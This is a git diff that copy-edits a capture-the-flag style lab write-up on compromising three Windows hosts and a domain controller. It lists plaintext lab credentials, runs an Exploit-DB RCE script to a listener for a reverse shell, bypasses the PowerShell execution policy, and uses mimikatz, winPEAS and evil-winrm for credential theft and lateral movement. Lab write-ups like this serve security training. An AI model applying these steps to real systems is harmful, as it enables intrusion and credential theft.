@@ -16,10 +16,10 @@
 
 ```
 admin:admin (applications manager portal)
-administrator:Reality2Show4!.? (local admin in 192.168.180.95)
-apache:New2Era4.! (local account in 192.168.180.96)
-administrator:Almost4There8.? (local account in x.x.x.96, found in mysql in 192.168.180.96)
-charlotte:Game20n4.! (mysql in 192.168.180.96)
+administrator:Reality2Show4!.? (local admin on 192.168.180.95)
+apache:New2Era4.! (local account on 192.168.180.96)
+administrator:Almost4There8.? (local account on 192.168.180.96, found in MySQL on 192.168.180.96)
+charlotte:Game20n4.! (MySQL on 192.168.180.96)
 
 other users:
 michael
@@ -27,7 +27,7 @@ michael
 
 ## Enumeration
 
-Ping sweeping the subnet give us three machines.
+Ping sweeping the subnet gives us three machines.
 
 ![](assets/Pasted%20image%2020250211205503.png)
 
@@ -37,30 +37,30 @@ Ping sweeping the subnet give us three machines.
 
 ![](assets/Pasted%20image%2020250211211330.png)
 
-Going to port 5001 we can see that the web server is in port 44444
+Going to port 5001, we can see that the web server is on port 44444.
 
 ![](assets/Pasted%20image%2020250211225426.png)
 
-In port 44444 we can see the main page of the service: applications manager by manage engine
+On port 44444, we can see the main page of the service: Applications Manager by ManageEngine.
 
 ![](assets/Pasted%20image%2020250211225526.png)
 
-Clicking on first time user? give us the default password `admin:admin` 
+Clicking on "First time user?" gives us the default credentials `admin:admin`.
 
-Inside we can see the app panel
+Inside, we can see the application panel.
 
 ![](assets/Pasted%20image%2020250211225802.png)
 
 ### Initial Access
 
-Searching for vulnerabilities, we try the RCE authenticated one.
+Searching for vulnerabilities, we try the authenticated RCE exploit:
 https://www.exploit-db.com/exploits/48793
 
 ![](assets/Pasted%20image%2020250211234131.png)
 
-We have to edit the script and change the java version to 8 for the script to work.
+We have to edit the script and change the Java version to 8 for the script to work.
 
-Start a listener on 666 and executed the script like this:
+Start a listener on port 6666 and execute the script like this:
 
 ![](assets/Pasted%20image%2020250211234228.png)
 
@@ -70,19 +70,19 @@ $ python rce.py http://192.168.180.95:44444 admin admin 192.168.45.229 6666
 
 ![](assets/Pasted%20image%2020250211234455.png)
 
-And we get a shell
+And we get a shell.
 
 ![](assets/Pasted%20image%2020250211234422.png)
 
 ### Post Exploitation
 
-We transfer winPEAS and adPEAS to the host using a python server and then iwr.
+We transfer winPEAS and adPEAS to the host using a Python server and then `iwr`.
 
 ![](assets/Pasted%20image%2020250212000051.png)
 
 ![](assets/Pasted%20image%2020250212000127.png)
 
-To execute the script we need to bypass powershell protection with
+To execute the script, we need to bypass PowerShell protection with:
 
 ```bash
 powershell -ep bypass
@@ -92,7 +92,7 @@ Then import and invoke the script:
 
 ![](assets/Pasted%20image%2020250212000241.png)
 
-We find charlotte who is member of Remote management users so we can rdp with it.
+We find Charlotte, who is a member of the Remote Management Users group, so we can RDP with her account.
 
 ![](assets/Pasted%20image%2020250212000520.png)
 
@@ -100,11 +100,11 @@ After that, we execute winPEAS.
 
 ![](assets/Pasted%20image%2020250212000712.png)
 
-Found autologgon creds for Administrator
+Found autologon credentials for Administrator.
 
 ![](assets/Pasted%20image%2020250212001008.png)
 
-And all the users and groups
+And all the users and groups.
 
 ![](assets/Pasted%20image%2020250212002227.png)
 
@@ -112,17 +112,18 @@ Transfer mimikatz to the machine and:
 
 ![](assets/Pasted%20image%2020250212003827.png)
 
-Check with cme and it's a local account for the other machine
+Check with CME, and it's a local account for the other machine.
 
 ![](assets/Pasted%20image%2020250212004020.png)
 
-Trying with winrm we can connect as a local account.
+Trying with winrm, we can connect as a local account.
 
 ![](assets/Pasted%20image%2020250212112734.png)
 
-To get the flag, evil-winrm with administrator
+To get the flag, use evil-winrm with Administrator.
 
 ![](assets/Pasted%20image%2020250212132811.png)
+
 ## 192.168.180.96
 
 ### Enumeration
@@ -131,21 +132,21 @@ To get the flag, evil-winrm with administrator
 
 ### Initial Access
 
-Connect to this machine with evil-winrm with credentials we found in x.x.x.95.
+Connect to this machine with evil-winrm using credentials we found on 192.168.180.95.
 
 ![](assets/Pasted%20image%2020250212112450.png)
 
-### Privesc
+### Privilege Escalation
 
-We found a xampp folder, inside we found mysql binaries and the current user has permissions to execute so
+We found a XAMPP folder. Inside, we found MySQL binaries, and the current user has permissions to execute them.
 
 ![](assets/Pasted%20image%2020250212121021.png)
 
-We got `administrator:Almost4There8.?` and `charlotte:Game20n4.!`
+We got `administrator:Almost4There8.?` and `charlotte:Game20n4.!`.
 
-### Post Explotation
+### Post Exploitation
 
-We reconnect with admin rights and got the flag.
+We reconnect with admin rights and get the flag.
 
 ![](assets/Pasted%20image%2020250212131746.png)
 
@@ -157,7 +158,7 @@ We reconnect with admin rights and got the flag.
 
 We can see that this host is the domain controller called dc01.secura.yzx.
 
-We can evil-winrm using charlotte credentials but is not working due to the lab
+We can use evil-winrm with Charlotte's credentials, but it is not working due to the lab's instability.
 
 !!! bug
-    I couldn't finishg this lab even following the walkthroughs, the lab is super unstable.
+    I couldn't finish this lab even after following the walkthroughs. The lab is super unstable.
